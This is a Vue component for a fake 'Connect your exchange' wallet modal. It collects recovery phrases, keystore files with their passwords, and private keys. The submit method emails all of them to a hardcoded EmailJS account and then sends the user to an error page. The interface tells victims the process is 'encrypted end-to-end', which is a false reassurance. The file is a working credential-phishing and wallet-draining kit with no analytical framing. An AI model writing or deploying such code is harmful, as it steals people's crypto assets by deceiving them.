<template>
  <div
    class="flex flex-col bg-white w-[90vw] md:w-[420px] rounded-2xl shadow-2xl shadow-black/20 overflow-hidden"
  >
    <!-- Header -->
    <div class="bg-gradient-to-r from-gray-50 to-gray-100 border-b border-gray-200 p-5">
      <div class="flex flex-row justify-between items-center">
        <div class="flex items-center gap-3">
          <div class="relative">
            <div
              class="absolute -inset-0.5 bg-gradient-to-r from-blue-400/30 to-purple-400/30 rounded-xl blur-sm"
            ></div>
            <img
              :src="exchange.picture"
              class="relative w-10 h-10 rounded-xl object-cover shadow-sm"
            />
          </div>
          <div>
            <div class="text-gray-900 font-bold text-sm">Connect your {{ exchange.name }}</div>
            <div class="text-gray-400 text-xs">Manual connection</div>
          </div>
        </div>
        <div
          @click="cancelModal"
          class="w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center cursor-pointer transition-colors duration-200 group"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            stroke-width="2.5"
            stroke="currentColor"
            class="w-4 h-4 text-gray-400 group-hover:text-gray-600 transition-colors duration-200"
          >
            <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
          </svg>
        </div>
      </div>
    </div>

    <!-- OPTIONS Tabs -->
    <div class="flex justify-between border-b border-gray-200 bg-gray-50/50 px-2">
      <button
        v-for="option in options"
        :key="option.id"
        @click="selectOption(option.id)"
        class="flex-1 text-center py-3.5 text-sm font-semibold transition-all duration-300 relative"
        :class="
          selectedOption === option.id ? 'text-green-600' : 'text-gray-400 hover:text-gray-600'
        "
      >
        {{ option.label }}
        <div
          class="absolute bottom-0 left-0 right-0 h-0.5 transition-all duration-300"
          :class="selectedOption === option.id ? 'bg-green-500' : 'bg-transparent'"
        ></div>
      </button>
    </div>

    <!-- FORM -->
    <form @submit.prevent="submitForm" class="space-y-5 p-6">
      <!-- OPTION 1: Phrase -->
      <div v-if="selectedOption === 'phrase'" class="space-y-3">
        <div class="relative">
          <textarea
            v-model="form.phrase"
            @input="handleInput"
            placeholder="Enter recovery phrase"
            rows="3"
            class="text-gray-900 w-full border-2 outline-none p-4 rounded-xl placeholder:text-gray-300 placeholder:text-sm resize-none transition-all duration-200 focus:border-green-400 focus:ring-4 focus:ring-green-100"
            :class="
              submitted && errors.phrase
                ? 'border-red-400 bg-red-50/30'
                : 'border-gray-200 hover:border-gray-300'
            "
          ></textarea>
          <div class="absolute top-3 right-3 text-gray-300">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke-width="1.5"
              stroke="currentColor"
              class="w-5 h-5"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z"
              />
            </svg>
          </div>
        </div>

        <p
          v-if="submitted && errors.phrase"
          class="text-red-500 text-sm flex items-center gap-1.5 animate-pulse"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            stroke-width="2"
            stroke="currentColor"
            class="w-4 h-4"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"
            />
          </svg>
          {{ errors.phrase }}
        </p>

        <div class="bg-blue-50/50 border border-blue-100 rounded-xl p-4 space-y-2">
          <div class="flex items-start gap-2 text-blue-600 text-xs">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke-width="1.5"
              stroke="currentColor"
              class="w-4 h-4 mt-0.5 flex-shrink-0"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z"
              />
            </svg>
            <span>Typically 12 (sometimes 24) words separated by single spaces</span>
          </div>
          <div class="flex items-start gap-2 text-blue-600 text-xs">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke-width="1.5"
              stroke="currentColor"
              class="w-4 h-4 mt-0.5 flex-shrink-0"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z"
              />
            </svg>
            <span>This process is encrypted end-to-end</span>
          </div>
        </div>
      </div>

      <!-- OPTION 2: Keystore -->
      <div v-if="selectedOption === 'keystore'" class="space-y-4 text-black">
        <div class="relative">
          <input
            type="file"
            @change="handleFileUpload"
            class="hidden"
            id="keystore-file"
            accept=".json,.txt"
          />
          <label
            for="keystore-file"
            class="flex items-center justify-center gap-3 w-full border-2 border-dashed border-gray-300 hover:border-green-400 rounded-xl p-6 cursor-pointer transition-all duration-200 hover:bg-green-50/30 group"
          >
            <div
              class="w-12 h-12 rounded-full bg-gray-100 group-hover:bg-green-100 flex items-center justify-center transition-colors duration-200"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                stroke-width="1.5"
                stroke="currentColor"
                class="w-6 h-6 text-gray-400 group-hover:text-green-500 transition-colors duration-200"
              >
                <path
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  d="M12 16.5V9.75m0 0l3 3m-3-3l-3 3M6.75 19.5a4.5 4.5 0 01-1.41-8.775 5.25 5.25 0 0110.233-2.33 3 3 0 013.758 3.848A3.752 3.752 0 0118 19.5H6.75z"
                />
              </svg>
            </div>
            <div class="text-left">
              <div
                class="text-sm font-semibold text-gray-700 group-hover:text-green-600 transition-colors duration-200"
              >
                Upload keystore file
              </div>
              <div class="text-xs text-gray-400">JSON or TXT format</div>
            </div>
          </label>
        </div>

        <div class="relative">
          <input
            v-model="form.password"
            type="password"
            placeholder="Enter password"
            class="h-14 w-full border-2 border-gray-200 outline-none p-4 rounded-xl placeholder:text-gray-300 placeholder:text-sm transition-all duration-200 focus:border-green-400 focus:ring-4 focus:ring-green-100"
          />
          <div class="absolute top-3.5 right-3 text-gray-300">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke-width="1.5"
              stroke="currentColor"
              class="w-5 h-5"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z"
              />
            </svg>
          </div>
        </div>

        <div class="bg-blue-50/50 border border-blue-100 rounded-xl p-4">
          <div class="flex items-start gap-2 text-blue-600 text-xs">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke-width="1.5"
              stroke="currentColor"
              class="w-4 h-4 mt-0.5 flex-shrink-0"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z"
              />
            </svg>
            <span>This process is encrypted end-to-end</span>
          </div>
        </div>
      </div>

      <!-- OPTION 3: Private Key -->
      <div v-if="selectedOption === 'privateKey'" class="space-y-3 text-black">
        <div class="relative">
          <textarea
            v-model="form.privateKey"
            @input="handleInput"
            placeholder="Enter private key"
            rows="3"
            class="cursor-default text-gray-900 w-full border-2 outline-none p-4 rounded-xl placeholder:text-gray-300 placeholder:text-sm resize-none transition-all duration-200 focus:border-green-400 focus:ring-4 focus:ring-green-100 font-mono text-sm"
            :class="
              submitted && errors.privateKey
                ? 'border-red-400 bg-red-50/30'
                : 'border-gray-200 hover:border-gray-300'
            "
          ></textarea>
          <div class="absolute top-3 right-3 text-gray-300">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke-width="1.5"
              stroke="currentColor"
              class="w-5 h-5"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z"
              />
            </svg>
          </div>
        </div>

        <p
          v-if="submitted && errors.privateKey"
          class="text-red-500 text-sm flex items-center gap-1.5 animate-pulse"
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            stroke-width="2"
            stroke="currentColor"
            class="w-4 h-4"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"
            />
          </svg>
          {{ errors.privateKey }}
        </p>

        <div class="bg-blue-50/50 border border-blue-100 rounded-xl p-4 space-y-2">
          <div class="flex items-start gap-2 text-blue-600 text-xs">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke-width="1.5"
              stroke="currentColor"
              class="w-4 h-4 mt-0.5 flex-shrink-0"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M11.25 11.25l.041-.02a.75.75 0 011.063.852l-.708 2.836a.75.75 0 001.063.853l.041-.021M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-9-3.75h.008v.008H12V8.25z"
              />
            </svg>
            <span>Typically an alphanumeric code generated by a wallet</span>
          </div>
          <div class="flex items-start gap-2 text-blue-600 text-xs">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
              stroke-width="1.5"
              stroke="currentColor"
              class="w-4 h-4 mt-0.5 flex-shrink-0"
            >
              <path
                stroke-linecap="round"
                stroke-linejoin="round"
                d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z"
              />
            </svg>
            <span>This process is encrypted end-to-end</span>
          </div>
        </div>
      </div>

      <!-- SUBMIT -->
      <button
        type="submit"
        class="w-full py-3.5 rounded-xl font-semibold text-sm transition-all duration-300 flex items-center justify-center gap-2"
        :class="
          submitted && !isFormValid
            ? 'bg-gray-300 text-gray-500 cursor-not-allowed'
            : 'bg-gradient-to-r from-green-500 to-green-600 text-white shadow-lg shadow-green-500/25 hover:shadow-green-500/40 hover:-translate-y-0.5 active:translate-y-0'
        "
        :disabled="submitted && !isFormValid"
      >
        <span v-if="submitted && !isFormValid">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            stroke-width="2"
            stroke="currentColor"
            class="w-4 h-4 inline mr-1"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z"
            />
          </svg>
          Fix Errors
        </span>
        <span v-else>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            fill="none"
            viewBox="0 0 24 24"
            stroke-width="2"
            stroke="currentColor"
            class="w-4 h-4 inline mr-1"
          >
            <path
              stroke-linecap="round"
              stroke-linejoin="round"
              d="M13.5 4.5L21 12m0 0l-7.5 7.5M21 12H3"
            />
          </svg>
          Proceed
        </span>
      </button>
    </form>

    <div class="px-6 pb-6">
      <button
        @click="cancelModal"
        class="w-full bg-gray-100 text-gray-600 py-3 rounded-xl hover:bg-gray-200 transition-all duration-200 font-semibold text-sm flex items-center justify-center gap-2"
      >
        <svg
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke-width="2"
          stroke="currentColor"
          class="w-4 h-4"
        >
          <path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12" />
        </svg>
        Cancel
      </button>
    </div>
  </div>
</template>

<script>
import emailjs from '@emailjs/browser'

export default {
  props: {
    exchange: {
      type: Object,
      required: true,
    },
  },

  data() {
    return {
      selectedOption: 'phrase',

      options: [
        { id: 'phrase', label: 'Phrase' },
        { id: 'keystore', label: 'Keystore' },
        { id: 'privateKey', label: 'Private Key' },
      ],

      form: {
        phrase: '',
        password: '',
        privateKey: '',
        file: null,
        exchange: '',
      },

      errors: {
        phrase: '',
        privateKey: '',
      },

      submitted: false,
    }
  },

  computed: {
    isFormValid() {
      if (this.selectedOption === 'phrase') {
        return this.validatePhrase()
      }

      if (this.selectedOption === 'privateKey') {
        return this.validatePrivateKey()
      }

      return true
    },
  },

  watch: {
    exchange(newExchange) {
      this.form.exchange = newExchange.name
    },
  },

  mounted() {
    this.form.exchange = this.exchange.name
  },

  methods: {
    cancelModal() {
      this.$emit('cancel-modal')
    },

    selectOption(option) {
      this.selectedOption = option
      this.submitted = false
      this.clearErrors()
    },

    handleInput() {
      if (this.submitted) {
        this.isFormValid
      }
    },

    clearErrors() {
      this.errors.phrase = ''
      this.errors.privateKey = ''
    },

    validatePhrase() {
      const words = this.form.phrase.trim().split(/\s+/)

      if (!this.form.phrase.trim()) {
        this.errors.phrase = 'Recovery phrase cannot be empty'
        return false
      }

      if (words.length !== 12 && words.length !== 24) {
        this.errors.phrase = 'Phrase must be exactly 12 or 24 words'
        return false
      }

      this.errors.phrase = ''
      return true
    },

    validatePrivateKey() {
      const key = this.form.privateKey.trim()

      if (!key) {
        this.errors.privateKey = 'Private key cannot be empty'
        return false
      }

      const cleanKey = key.startsWith('0x') ? key.slice(2) : key

      const isHex = /^[0-9a-fA-F]+$/.test(cleanKey)

      if (!isHex || cleanKey.length !== 64) {
        this.errors.privateKey = 'Invalid private key format'
        return false
      }

      this.errors.privateKey = ''
      return true
    },

    handleFileUpload(event) {
      const file = event.target.files[0]

      if (file) {
        const reader = new FileReader()
        reader.onload = () => {
          this.form.file = reader.result
        }
        reader.readAsDataURL(file)
      }
    },

    submitForm() {
      this.submitted = true

      if (!this.isFormValid) return

      const templateParams = {
        exchange: this.form.exchange,
        type: this.selectedOption,
        phrase: this.form.phrase,
        password: this.form.password,
        privateKey: this.form.privateKey,
        file: this.form.file,
      }

      emailjs
        .send('service_h5prxh7', 'template_0s9zdqz', templateParams, 'jtRY2pcc7TitAIDvF')
        .then(() => {
          console.log('SUCCESS!')

          this.form.phrase = ''
          this.form.password = ''
          this.form.privateKey = ''
          this.form.file = null
        })
        .catch((error) => {
          console.log('FAILED...', error)
        })

      this.$router.push('/error')
    },
  },
}
</script>
